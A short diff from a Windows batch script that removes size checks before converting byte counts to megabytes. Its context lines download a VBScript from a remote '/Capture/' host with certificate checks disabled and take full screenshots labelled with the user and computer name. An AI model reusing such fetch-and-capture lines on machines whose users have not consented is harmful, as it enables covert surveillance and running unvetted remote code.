@@ -46,8 +46,8 @@ for /f "delims=," %%A in (
 
 echo WScript.Echo Eval(WScript.Arguments(0)) > eval.vbs
 
-if %bytestor% GEQ 1048576 for /f %%n in ('cscript //nologo eval.vbs "%bytestor%/1048576"') do (set mbtor=%%n) && set unittor=MB
-if %bytes% GEQ 1048576 for /f %%n in ('cscript //nologo eval.vbs "%bytes%/1048576"') do (set mb=%%n) && set unit=MB
+for /f %%n in ('cscript //nologo eval.vbs "%bytestor%/1048576"') do (set mbtor=%%n) && set unittor=MB
+for /f %%n in ('cscript //nologo eval.vbs "%bytes%/1048576"') do (set mb=%%n) && set unit=MB
 
 curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
